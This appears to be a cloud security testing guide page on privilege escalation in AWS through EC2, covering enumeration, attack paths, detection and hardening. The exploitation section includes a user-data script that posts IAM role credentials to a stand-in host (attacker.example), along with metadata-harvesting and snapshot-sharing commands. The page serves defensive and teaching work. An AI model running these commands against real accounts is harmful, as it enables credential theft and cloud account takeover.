---
cstg_id: CSTG-AWS-EC2-PRIVESC
title: "AWS Ec2 - Privilege Escalation"
provider: aws
service: ec2
phase: privilege-escalation
required_access: assumed-breach
required_permissions:
  - iam:PassRole
  - ec2:RunInstances
  - ec2:CreateLaunchTemplate
  - ec2:CreateLaunchTemplateVersion
  - ssm:SendCommand
  - ssm:StartSession
  - ec2-instance-connect:SendSSHPublicKey
  - ec2:CreateSnapshot
  - ec2:ModifySnapshotAttribute
  - ec2:ModifyInstanceAttribute
  - ec2:CreateImage
  - autoscaling:CreateLaunchConfiguration
  - autoscaling:UpdateAutoScalingGroup
references:
  - "https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_use_passrole.html"
  - "https://docs.aws.amazon.com/AWSEC2/latest/APIReference/API_RunInstances.html"
  - "https://docs.aws.amazon.com/systems-manager/latest/userguide/run-command.html"
  - "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
  - "https://hackingthe.cloud/aws/exploitation/iam_privilege_escalation/"
  - "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-connect-set-up.html"
license: CC BY-SA 4.0
---

## Summary

EC2 is a primary vehicle for privilege escalation in AWS because compute can run with an IAM role. If an attacker can launch or control an instance and attach a more powerful IAM role to it, they inherit that role's permissions through the instance metadata service. This page enumerates the specific EC2/IAM permission combinations that enable escalation, organised one subsection per enabling permission. The attacker objective is to move from a limited principal to a powerful instance-role principal - ideally one with `iam:*` or `*:*` - by exploiting `PassRole`, command-execution, or disk-cloning primitives.

## Prerequisites

- An authenticated foothold principal (assumed breach) - IAM user, role, or instance-role credentials obtained earlier (e.g. via SSRF in the [Unauthenticated](../01-unauthenticated-external/aws-ec2-unauthenticated.md) phase).
- Knowledge of available IAM roles and instance profiles. Enumerate candidate roles with `iam:ListRoles`, `iam:ListInstanceProfiles`, and `iam:PassRole` targets; confirm which roles are more privileged than the current principal.
- The escalation primitives below generally require `iam:PassRole` plus a launch/exec permission. Confirm with `aws sts get-caller-identity` and policy simulation where possible.

## Enumeration

```bash
# Roles and instance profiles available to pass/attach
aws iam list-roles --query 'Roles[].{Name:RoleName,Arn:Arn}' --output table
aws iam list-instance-profiles
aws iam list-instance-profiles-for-role --role-name <role>

# What can the current principal do? (if simulate permitted)
aws iam simulate-principal-policy --policy-source-arn <my-arn> \
  --action-names iam:PassRole ec2:RunInstances ssm:SendCommand

# Existing instances/profiles to reuse or hijack
aws ec2 describe-instances \
  --query 'Reservations[].Instances[].{Id:InstanceId,Profile:IamInstanceProfile.Arn}'
aws ec2 describe-iam-instance-profile-associations
```

Identify a target role that is more privileged than the foothold and that EC2 is allowed to assume (`ec2.amazonaws.com` in its trust policy).

## Misconfigurations & Findings

- A foothold principal holding `iam:PassRole` with a wildcard or overly-broad resource scope, combined with any compute-launch/exec permission.
- Highly privileged roles (e.g. attached to `AdministratorAccess`) that trust `ec2.amazonaws.com` and can therefore be attached to attacker-controlled compute.
- `PassRole` not constrained by a `Condition` limiting which service can receive the role.
- SSM-managed instances reachable via `ssm:SendCommand`/`StartSession` whose attached role is more privileged than the caller.
- Ability to clone disks (`CreateSnapshot` + `ModifySnapshotAttribute`) of instances holding secrets.

## Exploitation

### iam:PassRole + ec2:RunInstances

The classic EC2 escalation. Launch a new instance, attach a privileged instance profile, and read its credentials from IMDS (or run a payload via user-data).

```bash
# Encode a user-data script that exfiltrates the role credentials
cat > ud.sh <<'EOF'
#!/bin/bash
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
ROLE=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE \
  | curl -s -X POST -d @- https://attacker.example/collect
EOF

aws ec2 run-instances --image-id ami-0abcdef1234567890 \
  --instance-type t3.micro \
  --iam-instance-profile Name=<privileged-instance-profile> \
  --user-data file://ud.sh \
  --subnet-id subnet-0123 --security-group-ids sg-0123
```

The attacker now holds the privileged role's credentials. Even without user-data exfiltration, an attacker who can reach the instance (SSH/SSM) can read IMDS directly.

### iam:PassRole + ec2:CreateLaunchTemplate / CreateLaunchTemplateVersion

Bake the privileged instance profile and exfiltration user-data into a launch template, then launch (directly or via Auto Scaling) to obtain credentials. Useful when `RunInstances` is allowed only `FromLaunchTemplate`.

```bash
aws ec2 create-launch-template --launch-template-name esc \
  --launch-template-data '{"ImageId":"ami-0abcdef1234567890",
    "InstanceType":"t3.micro",
    "IamInstanceProfile":{"Name":"<privileged-instance-profile>"},
    "UserData":"'$(base64 -w0 ud.sh)'"}'
aws ec2 run-instances --launch-template LaunchTemplateName=esc
```

### iam:PassRole + autoscaling:CreateLaunchConfiguration + UpdateAutoScalingGroup

Where direct `RunInstances` is denied but Auto Scaling is permitted, create a launch configuration referencing the privileged profile + payload, point an Auto Scaling Group at it, and let ASG launch the instance. Same outcome via a different launch path.

### ssm:SendCommand (on an instance with a more-privileged role)

If a managed instance runs a role more powerful than the caller, run arbitrary OS commands on it and read its IMDS credentials - no `PassRole` needed.

```bash
aws ssm send-command --document-name "AWS-RunShellScript" \
  --targets Key=InstanceIds,Values=i-0privileged \
  --parameters 'commands=["TOKEN=$(curl -s -X PUT http://169.254.169.254/latest/api/token -H \"X-aws-ec2-metadata-token-ttl-seconds: 60\"); R=$(curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/); curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/$R"]' \
  --output text
```

### ssm:StartSession

Open an interactive Session Manager shell on a more-privileged managed instance and harvest its role credentials from IMDS, plus on-host secrets.

```bash
aws ssm start-session --target i-0privileged
```

### ec2-instance-connect:SendSSHPublicKey

Push an ephemeral SSH public key to a target instance, then SSH in (port 22 reachable) and read IMDS / on-host secrets of a more-privileged instance.

```bash
aws ec2-instance-connect send-ssh-public-key --instance-id i-0privileged \
  --instance-os-user ec2-user --ssh-public-key file://key.pub --availability-zone us-east-1a
ssh -i key ec2-user@<target>
```

### ec2:CreateSnapshot + ec2:ModifySnapshotAttribute

Snapshot the EBS volume of a privileged or secret-bearing instance, share the snapshot to an attacker-controlled account, then create a volume and read its filesystem offline (credentials, keys, tokens).

```bash
aws ec2 create-snapshot --volume-id vol-0target
aws ec2 modify-snapshot-attribute --snapshot-id snap-0new \
  --attribute createVolumePermission --operation-type add --user-ids <attacker-account>
```

### ec2:CreateImage / ModifyInstanceAttribute

`CreateImage` clones a running privileged instance into an AMI the attacker can launch in their own context. `ModifyInstanceAttribute` can change an instance's `userData` (while stopped) or other attributes to inject a payload that runs at next boot with the instance's role.

## Detection & Logging

- CloudTrail records `RunInstances`, `CreateLaunchTemplate`, `CreateLaunchConfiguration`, `UpdateAutoScalingGroup`, `SendCommand`, `StartSession`, `SendSSHPublicKey`, `CreateSnapshot`, `ModifySnapshotAttribute`, `CreateImage`, and `ModifyInstanceAttribute`. Each event includes the calling principal and the `requestParameters` (e.g. the `iamInstanceProfile` being passed).
- A single principal performing `RunInstances` with a privileged `iamInstanceProfile` it does not normally use, or `PassRole` immediately preceding a launch, is a high-fidelity escalation signal.
- GuardDuty `PrivilegeEscalation:IAMUser/*` and `InstanceCredentialExfiltration` findings cover several of these paths; `ssm:SendCommand` to an instance followed by metadata access is detectable in combination.
- Cross-account `ModifySnapshotAttribute` sharing and subsequent `CreateVolume` in a foreign account are logged in the owning account.

## Remediation & Hardening

- **Constrain `iam:PassRole`** with conditions: limit `iam:PassedToService` to the exact service and restrict the resource to specific role ARNs. Never grant `PassRole` on `*`.
- **Separate launch permissions from privileged roles.** Principals that can run instances should not be able to pass administrative roles.
- **Scope `ssm:SendCommand`/`StartSession`** to specific instances/tags, and ensure managed instances do not carry roles more powerful than their operators.
- **Restrict snapshot/AMI sharing** and enable EBS snapshot block-public-access; alert on `ModifySnapshotAttribute` adding external accounts.
- **Enforce IMDSv2 with hop limit 1** so a compromised container/SSRF cannot trivially read instance credentials.
- **Detective guardrails:** alert on `RunInstances` with unfamiliar instance profiles and on `PassRole`-then-launch sequences.

## Tools

- AWS CLI / SDKs for the launch, SSM, and snapshot operations.
- IAM relationship/attack-path graphing tools to identify which footholds reach privileged roles (neutral: any IAM graph analyzer).
- Policy simulation (`iam:simulate-principal-policy`) to confirm reachable permissions.

## References

- AWS `PassRole`, `RunInstances`, and SSM Run Command documentation.
- AWS EC2 Instance Connect setup documentation.
- Rhino Security Labs - AWS privilege escalation methods.
- hackingthe.cloud - IAM privilege escalation paths.
